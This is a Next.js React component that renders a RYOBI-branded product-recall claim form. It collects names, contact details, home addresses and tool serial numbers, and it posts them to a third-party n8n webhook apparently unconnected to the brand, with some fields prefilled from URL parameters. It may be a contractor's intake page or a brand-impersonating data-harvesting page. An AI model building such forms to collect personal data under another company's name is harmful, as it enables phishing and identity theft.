"use client";
import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "next/navigation";

export default function HomeForm() {
  const searchParams = useSearchParams();
  const initialized = useRef(false);

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    street: "",
    city: "",
    state: "",
    zip: "",
    modelNumber: "",
    serialNumber: "",
    shipBox: "",
    emailLabel: "",
    recallSource: "",
  });

  // Prefill fields dynamically from URL query params (runs once)
  useEffect(() => {
    if (initialized.current) return;

    const phone = searchParams.get("phone") || "6135551111";
    const modelNumber = searchParams.get("model") || "RY-4567";
    const serialNumber = searchParams.get("serial") || "SN123456";

    setFormData((prev) => ({
      ...prev,
      phone,
      modelNumber,
      serialNumber,
    }));

    initialized.current = true;
  }, [searchParams]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmitting) return;

    setIsSubmitting(true);
    setErrorMessage("");

    try {
      const res = await fetch(
        "https://dashbpoai.app.n8n.cloud/webhook/f10840da-cb57-44b8-9fc4-a81fb7f1f147",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            ...formData,
            submittedAt: new Date().toISOString(),
          }),
        }
      );

      if (!res.ok) throw new Error("Webhook failed");

      alert("Form submitted successfully!");

      setFormData((prev) => ({
        ...prev,
        firstName: "",
        lastName: "",
        email: "",
        street: "",
        city: "",
        state: "",
        zip: "",
        shipBox: "",
        emailLabel: "",
        recallSource: "",
      }));
    } catch (error) {
      console.error(error);
      setErrorMessage("Submission failed. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      {/* NAVBAR */}
      <nav className="navbar">
        <div className="nav-top">
          <div className="logo">RYOBI</div>
          <input className="search" placeholder="Can we help you find something?" />
          <div className="nav-actions">
            <span>Support</span>
            <span>Register Products</span>
            <span className="cart">🛒</span>
          </div>
        </div>
      </nav>

      {/* FORM */}
      <main className="container">
        <h1>SUBMIT CLAIM</h1>

        <form className="form" onSubmit={handleSubmit} noValidate>
          {/* Customer Information */}
          <section>
            <h3>Customer Information</h3>
            <div className="row">
              <div>
                <label>First Name*</label>
                <input
                  name="firstName"
                  value={formData.firstName}
                  onChange={handleChange}
                  required
                />
              </div>
              <div>
                <label>Last Name*</label>
                <input
                  name="lastName"
                  value={formData.lastName}
                  onChange={handleChange}
                  required
                />
              </div>
            </div>

            <div className="row">
              <div>
                <label>Email*</label>
                <input
                  name="email"
                  type="email"
                  value={formData.email}
                  onChange={handleChange}
                  required
                />
              </div>
              <div>
                <label>Phone*</label>
                <input
                  name="phone"
                  value={formData.phone}
                  onChange={handleChange}
                  required
                />
              </div>
            </div>

            <div className="row">
              <div>
                <label>Street*</label>
                <input
                  name="street"
                  value={formData.street}
                  onChange={handleChange}
                  required
                />
              </div>
              <div>
                <label>City*</label>
                <input
                  name="city"
                  value={formData.city}
                  onChange={handleChange}
                  required
                />
              </div>
              <div>
                <label>State/Province*</label>
                <select
                  name="state"
                  value={formData.state}
                  onChange={handleChange}
                  required
                >
                  <option value="">State/Province</option>
                  <option value="ON">Ontario</option>
                  <option value="QC">Quebec</option>
                  <option value="BC">British Columbia</option>
                </select>
              </div>
              <div>
                <label>Zip/Postal Code*</label>
                <input
                  name="zip"
                  value={formData.zip}
                  onChange={handleChange}
                  required
                />
              </div>
            </div>
          </section>

          {/* Tool Details */}
          <section>
            <h3>Tool Details</h3>
            <div className="row">
              <div>
                <label>Model Number*</label>
                <input
                  name="modelNumber"
                  value={formData.modelNumber}
                  onChange={handleChange}
                  required
                />
              </div>
              <div>
                <label>Serial Number*</label>
                <input
                  name="serialNumber"
                  value={formData.serialNumber}
                  onChange={handleChange}
                  required
                />
              </div>
            </div>
          </section>

          {/* Additional Information */}
          <section>
            <h3>Additional Information</h3>

            <div className="full">
              <label>Do you need us to ship you a box?*</label>
              <select
                name="shipBox"
                value={formData.shipBox}
                onChange={handleChange}
                required
              >
                <option value="">Select Yes or No</option>
                <option value="Yes">Yes</option>
                <option value="No">No</option>
              </select>
            </div>

            <div className="full">
              <label>
                Can we use the email provided to send you a shipping label?*
              </label>
              <select
                name="emailLabel"
                value={formData.emailLabel}
                onChange={handleChange}
                required
              >
                <option value="">Select Yes or No</option>
                <option value="Yes">Yes</option>
                <option value="No">No</option>
              </select>
            </div>

            <div className="full">
              <label>How did you hear about this recall?</label>
              <select
                name="recallSource"
                value={formData.recallSource}
                onChange={handleChange}
              >
                <option value="">Select Option</option>
                <option value="Internet">Internet</option>
                <option value="Television">Television</option>
                <option value="Notification Letter">Notification Letter</option>
                <option value="Store Via Posting">Store Via Posting</option>
                <option value="Calling In">Calling In</option>
                <option value="Radio">Radio</option>
                <option value="Magazine">Magazine</option>
                <option value="Other">Other</option>
              </select>
            </div>
          </section>

          {errorMessage && <p className="error">{errorMessage}</p>}

          <p className="required">*Required</p>

          <button type="submit" className="submit" disabled={isSubmitting}>
            {isSubmitting ? "Submitting..." : "Submit Claim →"}
          </button>
        </form>
      </main>

      {/* FOOTER */}
      <footer className="footer">
        <div className="footer-content">
          <span>Contact Us</span>
          <div className="social-icons">
            {/* Add your SVG icons here as needed */}
            <a href="#" aria-label="Instagram">📸</a>
            <a href="#" aria-label="TikTok">🎵</a>
            <a href="#" aria-label="Facebook">📘</a>
            <a href="#" aria-label="YouTube">▶️</a>
            <a href="#" aria-label="Pinterest">📌</a>
          </div>
        </div>
        <div className="chat-widget" title="Chat with us">💬</div>
      </footer>
    </>
  );
}
